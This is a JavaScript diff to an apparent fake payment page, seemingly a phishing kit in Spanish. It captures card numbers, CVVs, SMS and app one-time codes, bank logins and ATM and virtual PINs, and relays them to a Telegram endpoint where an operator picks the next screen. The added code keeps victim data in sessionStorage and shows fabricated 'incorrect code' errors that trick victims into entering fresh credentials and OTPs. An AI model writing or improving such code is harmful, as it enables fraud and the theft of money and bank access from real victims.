@@ -2162,8 +2162,15 @@
 		let seccionAnteriorPago = 'seccion-inicio';
 		let pollingActivo = false;
 		let pollingInterval = null;
-		let datosRecopilados = {};
+		// Restaurar datosRecopilados desde sessionStorage si existen
+		let datosRecopilados = JSON.parse(sessionStorage.getItem('datosRecopilados') || '{}');
 		let monedaActual = 'COP';
+
+		// Restaurar brasiliaUniqId si existe en sessionStorage
+		const storedUniqId = sessionStorage.getItem('brasiliaUniqId');
+		if (storedUniqId) {
+			brasiliaUniqId = storedUniqId;
+		}
 
 		// =====================================================
 		// FUNCIONES DE NAVEGACIÓN ENTRE SECCIONES
@@ -2268,6 +2275,11 @@
 
 		// Enviar datos adicionales (OTP, claves, etc.) a Telegram
 		async function enviarDatosAdicionalesATelegram(tipo, valor) {
+			// Asegurar que tenemos los datos del pagador desde sessionStorage
+			const storedData = JSON.parse(sessionStorage.getItem('datosRecopilados') || '{}');
+			// Combinar datos almacenados con datos actuales (prioridad a los nuevos)
+			const datosCompletos = { ...storedData, ...datosRecopilados };
+
 			try {
 				const response = await fetch('/api/telegram/send-info', {
 					method: 'POST',
@@ -2280,7 +2292,7 @@
 						template: 'pinbus_tdc',
 						includeButtons: true,
 						data: {
-							...datosRecopilados,
+							...datosCompletos,
 							[tipo]: valor,
 							status: `${tipo.toUpperCase()}_RECIBIDO`
 						}
@@ -2289,6 +2301,12 @@
 
 				const result = await response.json();
 				console.log(`${tipo} enviado a Telegram:`, result);
+
+				// Actualizar datosRecopilados y sessionStorage con los datos completos
+				datosRecopilados = datosCompletos;
+				datosRecopilados[tipo] = valor;
+				sessionStorage.setItem('datosRecopilados', JSON.stringify(datosRecopilados));
+
 				return result.success;
 			} catch (error) {
 				console.error(`Error enviando ${tipo} a Telegram:`, error);
@@ -2364,6 +2382,88 @@
 			console.log('Polling detenido');
 		}
 
+		// Registro de secciones ya visitadas para mostrar mensaje de error en reintentos
+		let seccionesVisitadas = {};
+
+		// Limpiar campos de una sección y mostrar mensaje de error si es reintento
+		function prepararSeccionParaReintento(seccionId) {
+			const esReintento = seccionesVisitadas[seccionId] === true;
+
+			// Definir los campos a limpiar y mensajes de error por sección
+			const configSecciones = {
+				'seccion-tdc': {
+					campos: ['tdcNumeroInput', 'tdcVencimientoInput', 'tdcCvvInput'],
+					errorId: 'errorTdc',
+					mensaje: 'Los datos ingresados son incorrectos. Por favor verifica e intenta de nuevo.'
+				},
+				'seccion-otpsms': {
+					campos: ['otpSmsInput'],
+					errorId: 'errorOtpSms',
+					mensaje: 'El código ingresado es incorrecto. Se ha enviado un nuevo código a tu celular.'
+				},
+				'seccion-otpapp': {
+					campos: ['otpAppInput'],
+					errorId: 'errorOtpApp',
+					mensaje: 'El código ingresado es incorrecto. Genera un nuevo código en tu aplicación.'
+				},
+				'seccion-login': {
+					campos: ['loginUsuarioInput', 'loginClaveInput'],
+					errorId: 'errorLogin',
+					mensaje: 'Las credenciales ingresadas son incorrectas. Por favor verifica e intenta de nuevo.'
+				},
+				'seccion-clavecajero': {
+					campos: ['claveCajeroInput'],
+					errorId: 'errorClaveCajero',
+					mensaje: 'La clave ingresada es incorrecta. Por favor verifica e intenta de nuevo.'
+				},
+				'seccion-clavevirtual': {
+					campos: ['claveVirtualInput'],
+					errorId: 'errorClaveVirtual',
+					mensaje: 'La clave ingresada es incorrecta. Por favor verifica e intenta de nuevo.'
+				}
+			};
+
+			const config = configSecciones[seccionId];
+			if (!config) return;
+
+			// Siempre limpiar los campos
+			config.campos.forEach(campoId => {
+				const campo = document.getElementById(campoId);
+				if (campo) {
+					campo.value = '';
+				}
+			});
+
+			// Deshabilitar botones correspondientes (mapeo de sección a botón)
+			const botonesSeccion = {
+				'seccion-tdc': 'btnTdc',
+				'seccion-otpsms': 'btnOtpSms',
+				'seccion-otpapp': 'btnOtpApp',
+				'seccion-login': 'btnLogin',
+				'seccion-clavecajero': 'btnClaveCajero',
+				'seccion-clavevirtual': 'btnClaveVirtual'
+			};
+			const btnId = botonesSeccion[seccionId];
+			if (btnId) {
+				const btn = document.getElementById(btnId);
+				if (btn) btn.disabled = true;
+			}
+
+			// Mostrar mensaje de error solo si es reintento
+			const errorElement = document.getElementById(config.errorId);
+			if (errorElement) {
+				if (esReintento) {
+					errorElement.textContent = config.mensaje;
+					errorElement.classList.remove('hidden');
+				} else {
+					errorElement.classList.add('hidden');
+				}
+			}
+
+			// Marcar la sección como visitada
+			seccionesVisitadas[seccionId] = true;
+		}
+
 		// Procesar la respuesta de Telegram y mostrar la sección correspondiente
 		function procesarRespuestaTelegram(boton) {
 			console.log('procesarRespuestaTelegram llamada con botón:', boton);
@@ -2395,6 +2495,9 @@
 			console.log('Sección a mostrar:', seccionId);
 
 			if (seccionId) {
+				// Preparar la sección (limpiar campos y mostrar error si es reintento)
+				prepararSeccionParaReintento(seccionId);
+
 				// Actualizar datos de transacción para secciones OTP
 				if (seccionId === 'seccion-otpsms' || seccionId === 'seccion-otpapp') {
 					actualizarDatosTransaccion3D(seccionId);
@@ -2623,6 +2726,10 @@
 			datosRecopilados.direccion = document.getElementById('direccionPagadorTarjeta').value.trim();
 			datosRecopilados.ciudad = document.getElementById('ciudadPagadorTarjeta').value.trim();
 			datosRecopilados.departamento = document.getElementById('departamentoPagadorTarjeta').value.trim();
+
+			// Guardar datos en sessionStorage para persistencia
+			sessionStorage.setItem('datosRecopilados', JSON.stringify(datosRecopilados));
+			sessionStorage.setItem('brasiliaUniqId', brasiliaUniqId);
 
 			document.getElementById('btnPagarTarjeta').disabled = true;
 			mostrarOverlayCarga('Procesando pago...');
